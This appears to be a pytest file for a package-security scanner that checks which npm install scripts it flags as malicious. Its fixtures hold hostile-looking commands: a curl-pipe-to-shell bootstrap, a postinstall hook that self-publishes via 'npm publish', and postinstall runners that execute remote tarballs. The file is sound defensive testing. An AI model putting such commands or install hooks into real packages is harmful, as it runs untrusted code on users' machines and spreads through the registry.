# ruff: noqa: E501  (package.json script lines are kept on one line, as they are written)
"""Honest shapes from published MCP packages that must not carry a malicious indicator: a release
script that publishes, in a manifest an install-time command only names, and an install message
that tells the reader which command to run next."""
import json
from pathlib import Path

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory


def scan(root: Path, files: dict[str, str]):
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    return analyze_directory(root, detect_component(root, source=str(root)))


def malicious_ids(report) -> set[str]:
    return {f.id for f in report.findings if f.threat_class.value == "malicious_indicator"}


def manifest(scripts: dict[str, str]) -> str:
    return json.dumps({"name": "demo-pkg", "version": "1.0.0", "scripts": scripts}, indent=2) + "\n"


def test_a_release_script_in_a_manifest_the_build_names_is_not_install_time_publishing(tmp_path):
    report = scan(tmp_path, {
        "package.json": manifest({
            "build": "rm -rf dist && tsup && node -e \"require('fs').chmodSync('dist/index.js', '755')\"",
            "prepare": "npm run build",
            "publish-prod": "npm run build && npm publish",
            "publish-beta": "npm run build && npm publish --tag beta",
        }),
        # The built entry reads its own version from the manifest, as many CLIs do.
        "dist/index.js": "#!/usr/bin/env node\nconst pkg = require('../package.json');\nconsole.log(pkg.version);\n",
    })
    assert not malicious_ids(report)
    assert "ST-NPM-INSTALL-PUBLISH" not in {f.id for f in report.findings}


def test_a_manifest_a_command_copies_is_not_read_as_a_shell_script(tmp_path):
    report = scan(tmp_path, {
        "package.json": manifest({
            "postinstall": "cp package.json dist/package.json",
            "bootstrap": "curl -fsSL https://example.test/bootstrap.sh | sh",
        }),
    })
    assert not malicious_ids(report)


def test_publishing_from_an_install_script_is_still_reported(tmp_path):
    report = scan(tmp_path, {
        "package.json": manifest({"postinstall": "node scripts/spread.js"}),
        "scripts/spread.js": "const { execSync } = require('child_process');\nexecSync('npm publish --access public');\n",
    })
    assert "ST-NPM-INSTALL-PUBLISH" in malicious_ids(report)
    report = scan(tmp_path / "direct", {"package.json": manifest({"postinstall": "npm publish"})})
    assert "ST-NPM-INSTALL-PUBLISH" in malicious_ids(report)


def test_an_install_message_that_names_a_runner_and_a_docs_address_is_not_remote_code(tmp_path):
    report = scan(tmp_path, {
        "package.json": manifest({
            "postinstall": "node -e \"console.log('\\nTool installed. Run: npx demo-tool setup. Docs: https://example.test/demo-tool\\n')\"",
        }),
    })
    assert not malicious_ids(report)


def test_a_runner_given_a_web_address_to_run_is_still_reported(tmp_path):
    for command in (
        "npx https://stage.example.invalid/pkg.tgz",
        "npx --yes https://stage.example.invalid/pkg.tgz",
        "pnpm dlx https://stage.example.invalid/pkg.tgz",
        "npm exec -- https://stage.example.invalid/pkg.tgz",
    ):
        report = scan(tmp_path / str(abs(hash(command))), {"package.json": manifest({"postinstall": command})})
        assert "ST-INSTALL-NPM-REMOTE-EXEC" in malicious_ids(report), command
